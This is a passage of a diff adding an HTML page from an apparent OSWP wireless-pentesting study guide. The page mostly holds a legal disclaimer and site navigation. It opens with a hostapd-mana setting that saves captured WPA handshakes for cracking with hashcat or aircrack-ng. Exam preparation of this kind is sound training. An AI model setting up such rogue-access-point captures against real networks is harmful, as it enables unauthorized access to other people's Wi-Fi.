+mana_wpaout=/home/kali/name.hccapx # specifies where to save handshakes, each handshake is appended to the file, can be decrypted with hashcat -m 2500 or aircrack-ng
+# if mana_wpaout is producing error: unknown configuration item 'mana_wpaout' make sure you are using command hostapd-mana and not hostapd command
+</code></pre>
+<h2 id="disclaimer-and-legal-notice"><a class="header" href="#disclaimer-and-legal-notice">Disclaimer and Legal Notice</a></h2>
+<h3 id="ethical-considerations-and-legal-compliance"><a class="header" href="#ethical-considerations-and-legal-compliance">Ethical Considerations and Legal Compliance</a></h3>
+<p>The techniques, commands, and procedures outlined in this guide are intended solely for educational purposes and preparing for the Offensive Security PEN-210 course (Offensive Security Wireless Pentester - OSWP). These techniques involve methodologies that, if misused, may constitute illegal activities. Users are strongly cautioned against engaging in any unauthorized and/or unlawful actions.</p>
+<h3 id="scope-of-use"><a class="header" href="#scope-of-use">Scope of Use</a></h3>
+<ul>
+<li><strong>Authorized Environments Only</strong>: The execution of penetration testing, network attacks, and other tactics described herein should only be performed on networks and systems that are explicitly owned or authorized for testing by the user. This includes personal hardware, controlled environments, or environments for which explicit, documented permission has been granted.</li>
+<li><strong>No Unauthorized Use</strong>: Under no circumstances should these techniques be applied to networks, systems, or devices without explicit authorization. Unauthorized use of these techniques may lead to legal consequences and is strongly condemned.</li>
+</ul>
+<h3 id="exam-conduct"><a class="header" href="#exam-conduct">Exam Conduct</a></h3>
+<ul>
+<li><strong>Adherence to Exam Guidelines</strong>: While this guide serves as preparation material for the OSWP exam, users must strictly adhere to the guidelines, rules, and ethical standards set forth by Offensive Security during the examination.</li>
+<li><strong>Prohibited Actions</strong>: Any attempt to use these techniques outside of the specified exam environment, or in a manner not aligned with the exam's rules, may result in disqualification, legal action, and other serious consequences.</li>
+</ul>
+<h3 id="liability"><a class="header" href="#liability">Liability</a></h3>
+<ul>
+<li><strong>No Responsibility for Misuse</strong>: The authors, contributors, and associated entities of this guide accept no responsibility or liability for any misuse, damage, or illegal activities arising from the information presented. Users are solely responsible for their actions.</li>
+<li><strong>Acknowledgment of Risk</strong>: Users acknowledge the risks involved in security testing and penetration testing and agree to ensure ethical and legal use of this information.</li>
+</ul>
+<h3 id="continuous-learning-and-ethical-growth"><a class="header" href="#continuous-learning-and-ethical-growth">Continuous Learning and Ethical Growth</a></h3>
+<ul>
+<li><strong>Commitment to Ethical Hacking</strong>: Users are encouraged to pursue knowledge in cybersecurity and ethical hacking with a strong commitment to legal compliance, ethical behavior, and respect for privacy and data protection.</li>
+</ul>
+<p>By using the information in this guide, you acknowledge having read, understood, and agreed to this disclaimer and all its terms. Your use of this information indicates your acceptance of the risks and your commitment to using this knowledge responsibly and ethically.</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="Roadmap.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="chapter_1.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="Roadmap.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="chapter_1.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
